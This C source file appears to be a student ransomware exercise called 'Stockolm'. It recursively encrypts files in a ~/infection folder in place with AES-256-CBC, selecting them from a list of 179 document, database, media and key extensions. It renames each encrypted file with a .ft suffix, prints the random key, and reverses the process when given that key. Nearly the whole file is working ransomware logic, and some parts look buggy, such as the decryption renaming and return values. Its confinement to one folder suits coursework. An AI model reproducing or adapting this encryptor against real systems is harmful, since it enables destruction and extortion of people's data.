#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <pwd.h>
#include <limits.h>
#include <string.h>
#include <bsd/string.h>
#include <sys/stat.h>
#include <dirent.h>
#include <openssl/rand.h>

#include <fcntl.h>
#include <sys/time.h>

#define VERSION	"Stockolm, version 1.0"
#define	FOLDER	"infection"
#define EXTENSION ".123 .3dm .3ds .3g2 .3gp .602 .7z .accdb .aes .ai .ARC .asc .asf .asm .asp .avi .backup .bak .bat .bmp .brd .bz2 .c .cgm .class .cmd .cpp .crt .cs .csr .csv .db .dbf .dch .der .dif .dip .djvu .doc .docb .docm .docx .dot .dotm .dotx .dwg .edb .eml .fla .flv .frm .gif .gpg .gz .h .hwp .ibd .iso .jar .java .jpeg .jpg .js .jsp .key .lay .lay6 .ldf .m3u .m4u .max .mdb .mdf .mid .mkv .mml .mov .mp3 .mp4 .mpeg .mpg .msg .myd .myi .nef .odb .odg .odp .ods .odt .onetoc2 .ost .otg .otp .ots .ott .p12 .PAQ .pas .pdf .pem .pfx .php .pl .png .pot .potm .potx .ppam .pps .ppsm .ppsx .ppt .pptm .pptx .ps1 .psd .pst .rar .raw .rb .rtf .sch .sh .sldm .sldm .sldx .slk .sln .snt .sql .sqlite3 .sqlitedb .stc .std .sti .stw .suo .svg .swf .sxc .sxd .sxi .sxm .sxw .tar .tbk .tgz .tif .tiff .txt .uop .uot .vb .vbs .vcd .vdi .vmdk .vmx .vob .vsd .vsdx .wav .wb2 .wk1 .wks .wma .wmv .xlc .xlm .xls .xlsb .xlsm .xlsx .xlt .xltm .xltx .xlw .zip "
#define NB_EXT		179
#define	KEY_SIZE	32
#define PATH_MAX	4096

#define	NAME_MAX	255

// extern int errno;
//  #include <time.h>

long	gettime(void)
{
	struct timeval	time;

	gettimeofday(&time, NULL);
	return ((time.tv_sec * 1000000) + (time.tv_usec));
}


int	is_ft_ext(char *file_name)
{
	char *p = strrchr(file_name, '.');
	int i = 0;

	if (!p)
		return (0);
	while (p[i])
	{
		if (i++ == 3)
			return (0);
	}
	if (i != 3)
		return (0);
	if (p[1] != 'f' && p[2] != 't')
		return (0);
	return (1);

}

int	good_extension(char *file_name)
{
	char *p = strrchr(file_name, '.');
	char	file_ext[16];
	int i = 0;
	int	e = 0;

	if (!p)
		return (0);
	while (*p != '\0')
	{
		if (i == 15)
			return (0);
		file_ext[i] = *p;
		if (file_ext[i] == ' ')
			return (0);
		p++;
		i++;
 	}
	file_ext[i] = '\0';
	while (EXTENSION[e] != '\0')
	{
		i = 0;
		while (file_ext[i] && EXTENSION[e])
		{
			if (file_ext[i] != EXTENSION[e])
				break ;
			if (EXTENSION[e] == ' ')
			{
				i++;
				break ;
			}
			i++;
			e++;
		}
		if (file_ext[i] == '\0' && EXTENSION[e] == ' ')
			return (1);
		while (EXTENSION[e] != ' ')
			e++;
		e++;
	}
	return (0);
}

int	create_key(char *new_key, int silence)
{
	if (!RAND_bytes(new_key, KEY_SIZE))
	{
		fprintf(stderr, "Error: generating key\n");
		return (-1);
	}
	printf("\nKey created:\n", new_key);
	write(1, new_key, KEY_SIZE);
	write(1, "\n", 1);
	return (0);

}

char	*get_home()
{
	char *home_dir = NULL;

	home_dir = getenv("HOME");
	if (!home_dir)
	{
		struct passwd *pw = getpwuid(getuid());
		if (!pw)
			return (NULL);
		home_dir = pw->pw_dir;
	}
	return (home_dir);
}

int is_dir_exists(const char *path) {
    struct stat st;

    if (stat(path, &st) == -1) {
        return -1; // Le dossier n
    }
	if (S_ISDIR(st.st_mode))
    	return (0); // Vérifie que c'est bien un dossier
	return (-1);
}

int	file_decryptage(int fd, char *path_file, char *key)
{
	unsigned char	iv[16]; // 128 bits (taille standart pour AES)
	char			new_name[NAME_MAX + 1];


	int input = openat(fd, path_file, O_RDWR);
	if (input == -1)
		return (perror("Error: open input\n"), 0);

	strlcpy(new_name, path_file, strlen(path_file) - 2);
	if (renameat(fd, path_file, fd, new_name) == -1)
		return (perror("Error: rename impossible\n"), 0);
	
	unsigned char	in_buf[4096];
	unsigned char	out_buf[4096 + 16];
	int				out_len = 4096;
	int				bytes_read = 0;
	int				byte_write = 0;

	if ((bytes_read = read(input, iv, sizeof(iv))) != sizeof(iv))
	{
		close(input);
		return (printf("File was not crypted : iv = %s et b r = %d, size of iv = %d\n", iv, bytes_read, sizeof(iv)), 0);
	}

	long	read_pos = bytes_read;
	long	write_pos = 0;

	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
	if (!ctx)
	{
	    close(input);
		return (fprintf(stderr, "Error: Cannot init cipher ctx\n", 0));
	}
	EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

	while ((bytes_read = pread(input, in_buf, sizeof(in_buf), read_pos)) > 0)
	{
        EVP_DecryptUpdate(ctx, out_buf, &out_len, in_buf, bytes_read);
        
        pwrite(input, out_buf, out_len, write_pos);
        read_pos += bytes_read;
        write_pos += out_len;
    }
	// printf("read pos final = %ld et size = %d\n", read_pos, bytes_read);

    EVP_DecryptFinal_ex(ctx, out_buf, &out_len);
    pwrite(input, out_buf, out_len, write_pos);
	// printf("write pos final = %ld et size = %d\n", write_pos, out_len);

    // Tronquer le fichier à la taille finale
    ftruncate(input, write_pos + out_len);

    EVP_CIPHER_CTX_free(ctx);
    close(input);
}


// Cette version ne creer pas de second fichier mais ecrit directement dans la cible

int	file_cryptage(int fd, char *path_file, char *key)
{
	unsigned char	iv[16]; // 128 bits (taille standart pour AES)
	char			new_name[NAME_MAX + 1];

	//indispensable pour avoir des fichier cripter differament (a stocker dans le fichier)
	if (!RAND_bytes(iv, sizeof(iv)))
		return(fprintf(stderr, "Error: generating iv\n"), 0);

	strlcpy(new_name, path_file, 256);	
	if (strlcat(new_name, ".ft", NAME_MAX) > NAME_MAX)
		return (fprintf(stderr, "Error:new file name is to long\n"), 0);
		
	if (renameat(fd, path_file, fd, new_name) == -1)
		return (perror("Error: rename impossible\n"), 0);

	int input = openat(fd, new_name,  O_RDWR);
	if (input == -1)
		return (perror("Error: open input\n"), 0);

	unsigned char	in_buf[4096];
	unsigned char	tmp_buf[4096 + EVP_MAX_BLOCK_LENGTH];
	unsigned char	out_buf[4096 + EVP_MAX_BLOCK_LENGTH];
	int				bytes_read = 0;
	int				bytes_write = 0;
	int				out_len = 0;
	int				tmp_len = 0;

	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
	if (!ctx)
	{
		close(input);
		return (fprintf(stderr, "Error: Cannot init cipher ctx\n"), 0);
	}

	EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

	
	memcpy(out_buf, iv, sizeof(iv));
	out_len = sizeof(iv);

	long	read_pos = 0;
	long	write_pos = 0;

	while ((bytes_read = pread(input, in_buf, sizeof(in_buf), read_pos)) > 0)
	{
		read_pos += bytes_read;
		EVP_EncryptUpdate(ctx, tmp_buf, &tmp_len, in_buf, bytes_read);
		if (read_pos > (write_pos + out_len))
    	{
			bytes_write = pwrite(input, out_buf, out_len, write_pos);
			// printf("the first write\n");
			// write(1, out_buf, out_len);
			write_pos += bytes_write;
		}
		// printf("read pos = %ld, write_pos = %ld, out_len = %d, tmp_len = %d\n", read_pos, write_pos, out_len, tmp_len);
		memcpy(out_buf, tmp_buf, tmp_len);
		out_len = tmp_len;
	}

    write_pos += pwrite(input, out_buf, out_len, write_pos);
	EVP_EncryptFinal_ex(ctx, tmp_buf, &tmp_len);
    write_pos += pwrite(input, tmp_buf, tmp_len, write_pos);
	// printf("the final write\n");
	// printf("read pos = %ld, write_pos = %ld, out_len = %d, tmp_len = %d\n", read_pos, write_pos, out_len, tmp_len);

    EVP_CIPHER_CTX_free(ctx);
    close(input);
	return (1);
}

// int	file_cryptage(int fd, char *path_file, char *key)
// {
// 	unsigned char	iv[16] = {0}; // 128 bits (taille standart pour AES)
// 	char			new_name[NAME_MAX + 1];

// 	//indispensable pour avoir des fichier cripter differament (a stocker dans le fichier)
// 	if (!RAND_bytes(iv, sizeof(iv)))
// 		return(fprintf(stderr, "Error: generating iv\n"), 0);

// 	int input = openat(fd, path_file, O_RDONLY);
// 	if (input == -1)
// 		return (perror("Error: open input\n"), 0);

// 	strlcpy(new_name, path_file, 256);	
// 	if (strlcat(new_name, ".ft", NAME_MAX) > NAME_MAX)
// 		return (close(input), fprintf(stderr, "Error:new file name is to long\n"), 0);

// 	int output = openat(fd, new_name, O_CREAT | O_WRONLY | O_TRUNC,  0644); // Enlever O_TRUNC pour la version final
// 	if (output == -1)
// 	{	
// 		close(input);
// 		return (perror("Error: open output\n"), 0);
// 	}
	
// 	unsigned char	in_buf[4096] = {0};
// 	unsigned char	out_buf[4096 + EVP_MAX_BLOCK_LENGTH] = {0};
// 	int				bytes_read = 4096;
// 	int				out_len = 4096 + EVP_MAX_BLOCK_LENGTH;

// 	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
// 	if (!ctx)
// 	{
// 		close(input);
//     	close(output);
// 		return (fprintf(stderr, "Error: Cannot init cipher ctx\n"), 0);
// 	}

// 	EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

// 	if (write(output, iv, sizeof(iv)) != sizeof(iv))
// 		printf("error: iv was not write in file\n");

// 	while ((bytes_read = read(input, in_buf, sizeof(in_buf))) > 0)
// 	{
// 		EVP_EncryptUpdate(ctx, out_buf, &out_len, in_buf, bytes_read);
//     	write(output, out_buf, out_len);		
// 	}

// 	EVP_EncryptFinal_ex(ctx, out_buf, &out_len);
//     write(output, out_buf, out_len);

//     // 7. Nettoyage
//     EVP_CIPHER_CTX_free(ctx);
//     close(input);
//     close(output);
// 	return (1);
// }

int	folder_decryptage(char *path_to_folder, char *key, int silence)
{
	if (access(path_to_folder, R_OK | W_OK | X_OK) == -1)
	    return (fprintf(stderr, "Error: Access refused for %s\n", path_to_folder), 0);

	DIR	*rep = opendir(path_to_folder);
	struct dirent	*ent = NULL;
	size_t			size;

	if (rep != NULL)
	{
		int fd = dirfd(rep);
		if (fd == -1)
			return (free(rep), 1);

		if (strlcat(path_to_folder, "/", PATH_MAX) > PATH_MAX)
			return (free(rep), fprintf(stderr, "Error: path of directorie to long: %s\n", path_to_folder), 1);

		size = strlen(path_to_folder);

		if (!silence)
			printf("\nOpen directorie %s\n\n", path_to_folder);

		while ((ent = readdir(rep)) != NULL)
		{
			if (!strncmp(".", ent->d_name, 1) || !strncmp("..", ent->d_name, 2)) {
				continue ; }
			
			path_to_folder[size] = '\0';

			if (ent->d_type == DT_DIR)
			{
				if (strlcat(path_to_folder, ent->d_name, PATH_MAX) > PATH_MAX)
				{	
					fprintf(stderr, "Error: path of directorie to long: %s et name = %s\n", path_to_folder, ent->d_name);
					continue ;
				}
				folder_decryptage(path_to_folder, key, silence);
				continue ;
			}

			else if (is_ft_ext(ent->d_name))
			{
				if (!silence)
					printf("decryptage de %s%s\n\n", path_to_folder, ent->d_name);
				file_decryptage(fd, ent->d_name, key);
			}
		}
	}
	else
	{
		fprintf(stderr, "Cannot open folder %s\n", path_to_folder);
		return (1);
	}
	if (closedir(rep) == -1)
		fprintf(stderr, "cannot close dirent\n");
	// free(rep);
	return (0);

}

int	folder_cryptage(char *path_to_folder, char *key, int silence)
{
	if (access(path_to_folder, R_OK | W_OK | X_OK) == -1)
	    return (fprintf(stderr, "Error: Access refused for %s\n", path_to_folder), 1);

	DIR	*rep = opendir(path_to_folder);
	struct dirent	*ent = NULL;
	size_t			size;

	if (rep != NULL)
	{
		int fd = dirfd(rep);
		if (fd == -1)
			return (free(rep), 1);

		if (strlcat(path_to_folder, "/", PATH_MAX) > PATH_MAX)
			return (free(rep), fprintf(stderr, "Error: path of directorie to long: %s\n", path_to_folder), 1);

		size = strlen(path_to_folder);

		if (!silence)
			printf("\nOpen directorie %s\n\n", path_to_folder);

		while ((ent = readdir(rep)) != NULL)
		{
			if (!strncmp(".", ent->d_name, 1) || !strncmp("..", ent->d_name, 2)) {
				continue ; }
			
			path_to_folder[size] = '\0';

			if (ent->d_type == DT_DIR)
			{
				if (strlcat(path_to_folder, ent->d_name, PATH_MAX) > PATH_MAX)
				{	
					fprintf(stderr, "Error: path of directorie to long: %s et name = %s\n", path_to_folder, ent->d_name);
					continue ;
				}
				folder_cryptage(path_to_folder, key, silence);
				continue ;
			}

			else if (good_extension(ent->d_name))
			{
				if (!silence)
					printf("cryptage de %s%s\n\n", path_to_folder, ent->d_name);
				file_cryptage(fd, ent->d_name, key);
			}
		}
	}
	else
	{
		fprintf(stderr, "Cannot open folder %s\n", path_to_folder);
		return (1);
	}
	closedir(rep);
	// free(rep);
	return (0);

}

int	main(int argc, char *argv[])
{
	int		opt;
	char	*key = NULL;
	int		silent_mode = 0;

	long	time = 0;
	long	debut;
	long	fin;
	long	t_decryptage;
	long	t_cryptage;

	// errno = 0;
	while ((opt = getopt(argc, argv, "hvr:s")) != -1)
	{
		switch (opt)
		{
			case 'h':
				printf("Usage: %s [-h] [-v] [-r KEY] [-s]\n", argv[0]); // faire une meilleur doc
				break ;
			case 's':
				silent_mode = 1;
				break ;
			case 'v':
				printf("%s\n", VERSION);
				break ;
			case 'r':
				key = optarg;
				break ;
			case '?':
				if (optopt == 'r')
					fprintf(stderr, "Option -%c requires an argument.\n", optopt);
				else if (isprint (optopt))
					fprintf (stderr, "Unknown option `-%c'.\n", optopt);
        		else
          			fprintf (stderr, "Unknown option character `\\x%x'.\n", optopt);
				return (1);
			default:
				fprintf(stderr, "Invalid option\n");
				return (1); 
		}
	}

	char path_to_folder[PATH_MAX + 1];
	char *path_home = get_home();

	if (!path_home)
		return (fprintf(stderr, "Error: Cannot find home directorie\n"), 1);

	if (snprintf(path_to_folder, sizeof(path_to_folder), "%s/%s", path_home, FOLDER) == -1)
		return (fprintf(stderr, "Error: Concatenation path\n"), 1);

	if (is_dir_exists(path_to_folder) == -1)
		return (fprintf(stderr, "Error: Cannot access folder %s\n", path_to_folder), 1);
	
	if (key == NULL)
	{
		char new_key[32];
		if (create_key(new_key, silent_mode) == -1)
			return (1);
		
		debut = gettime();
		if (folder_cryptage(path_to_folder, new_key, silent_mode))
			return (1);
		fin = gettime();
		t_cryptage = fin - debut;
		debut = fin;
		path_to_folder[strlen(path_to_folder) - 1] = '\0';
		if (folder_decryptage(path_to_folder, new_key, silent_mode))
			return (1);
		fin = gettime();
		t_decryptage = fin - debut;
		printf("Time for Cryptage = %ld et Time for Decryptage = %ld, Total = %ld\n", t_cryptage, t_decryptage, t_cryptage + t_decryptage);
	}
	else
	{
		if (folder_decryptage(path_to_folder, key, silent_mode))
			return (1);

	}



	return (0);

}